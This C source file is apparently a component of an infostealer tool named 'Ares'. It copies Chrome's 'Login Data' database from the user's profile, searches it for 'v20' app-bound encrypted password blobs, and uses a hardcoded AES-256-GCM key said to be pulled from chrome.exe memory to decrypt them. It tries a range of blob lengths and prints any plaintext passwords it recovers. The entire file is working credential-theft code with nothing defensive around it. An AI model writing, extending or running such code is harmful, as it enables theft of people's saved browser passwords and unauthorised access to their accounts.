/* Validate extracted key by decrypting Login Data passwords */
#include <windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include <wincrypt.h>

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Ares Key Validation — AES-256-GCM Decrypt Test\n\n");

    /* The key extracted from chrome.exe memory */
    BYTE key[] = {
        0x86,0x87,0x08,0x5E,0x2D,0xE1,0x12,0xA0,
        0x29,0xB0,0x16,0xBD,0xA0,0x2E,0xC3,0x5D,
        0xCB,0x8E,0xB9,0x63,0xA9,0x64,0x83,0xB2,
        0x3A,0x72,0xF2,0x18,0x16,0x54,0x85,0x50
    };
    printf("[*] Key: ");
    for (int i = 0; i < 32; i++) printf("%02X", key[i]);
    printf("\n");

    /* Read Login Data and find v20 encrypted password */
    char la[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
    char dbPath[512], tmpDb[MAX_PATH];
    snprintf(dbPath, sizeof(dbPath), "%s\\Google\\Chrome\\User Data\\Default\\Login Data", la);
    GetTempPathA(MAX_PATH, tmpDb);
    strcat(tmpDb, "ares_val.db");
    CopyFileA(dbPath, tmpDb, FALSE);

    HANDLE hDB = CreateFileA(tmpDb, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hDB == INVALID_HANDLE_VALUE) { printf("[-] No Login Data\n"); return 1; }
    DWORD dbSize = GetFileSize(hDB, NULL);
    BYTE* dbData = (BYTE*)VirtualAlloc(NULL, dbSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD rd; ReadFile(hDB, dbData, dbSize, &rd, NULL); CloseHandle(hDB);
    DeleteFileA(tmpDb);

    printf("[*] Login Data: %lu bytes\n", rd);

    /* Find v20 blobs */
    int tried = 0, decrypted = 0;
    for (DWORD i = 0; i + 50 < rd; i++) {
        if (dbData[i]=='v' && dbData[i+1]=='2' && dbData[i+2]=='0') {
            /* v20 format: "v20" + encrypted blob
             * The encrypted blob structure:
             * [3 bytes "v20"] [12 bytes nonce] [ciphertext] [16 bytes GCM tag]
             * Try different total sizes */
            tried++;
            if (tried > 5) break; /* Only test first 5 */

            printf("\n[*] v20 blob #%d at offset 0x%lX\n", tried, i);
            printf("    First 20 bytes: ");
            for (int j = 0; j < 20 && i+j < rd; j++) printf("%02X ", dbData[i+j]);
            printf("...\n");

            /* Try AES-GCM decrypt with various assumed lengths */
            for (int totalLen = 40; totalLen <= 300; totalLen += 1) {
                if (i + totalLen > rd) break;

                const BYTE* nonce = &dbData[i + 3];
                int dataLen = totalLen - 3 - 12 - 16;
                if (dataLen <= 0 || dataLen > 256) continue;

                BCRYPT_ALG_HANDLE hAlg = NULL;
                BCRYPT_KEY_HANDLE hKey = NULL;
                BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
                BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                    sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
                BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, 32, 0);

                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
                BCRYPT_INIT_AUTH_MODE_INFO(ai);
                ai.pbNonce = (PUCHAR)nonce; ai.cbNonce = 12;
                ai.pbTag = (PUCHAR)(&dbData[i + 3 + 12 + dataLen]); ai.cbTag = 16;

                BYTE pt[512] = {0};
                ULONG ptLen = 0;
                NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)&dbData[i + 15],
                    dataLen, &ai, NULL, 0, pt, sizeof(pt), &ptLen, 0);

                BCryptDestroyKey(hKey);
                BCryptCloseAlgorithmProvider(hAlg, 0);

                if (st == 0 && ptLen > 0) {
                    /* Check if decrypted text looks valid */
                    int printable = 0;
                    for (ULONG c = 0; c < ptLen; c++)
                        if (pt[c] >= 0x20 && pt[c] < 0x7F) printable++;
                    if (printable > (int)ptLen / 2) {
                        printf("[+] DECRYPTED! (len=%lu): %.*s\n", ptLen, ptLen, pt);
                        decrypted++;
                        break;
                    }
                }
            }
        }
    }

    VirtualFree(dbData, 0, MEM_RELEASE);
    printf("\n[*] Results: %d tried, %d decrypted\n", tried, decrypted);
    return decrypted > 0 ? 0 : 1;
}
